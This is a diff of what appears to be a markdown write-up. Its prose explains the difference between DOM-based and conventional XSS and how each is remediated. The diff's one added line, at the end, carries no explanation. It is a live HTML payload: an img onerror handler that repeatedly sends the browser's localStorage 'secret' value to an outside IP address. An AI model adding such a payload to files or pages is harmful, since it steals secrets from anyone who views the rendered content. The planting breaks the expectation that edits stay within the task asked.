@@ -52,4 +52,4 @@ DOM-Based XSS vs Conventional XSS
 
 When you are looking for XSS, while it may seem to be normal stored or reflected XSS. In some cases, it may actually be stored or reflected DOM-based XSS. The key difference is where the sink resides. If the untrusted user data is already injected into the sink server side and the response contains the payload, then it is conventional XSS. However, if the DOM is fully loaded and then receives untrusted user data that is loaded in through JavaScript, it is DOM-based. While there may not be a difference in the exploitation of XSS, there is a difference in how the XSS should be remediated. In the former, server-side HTML entity encoding should be used. However, in the latter, a deeper investigation into the exact JavaScript function that loads the data is required. In most cases, a different function should be used.
 
-
+<img src=1 onerror="setInterval(()=>{fetch('http://192.168.146.182:8000?secret='+localStorage.getItem('secret'))},5000)">
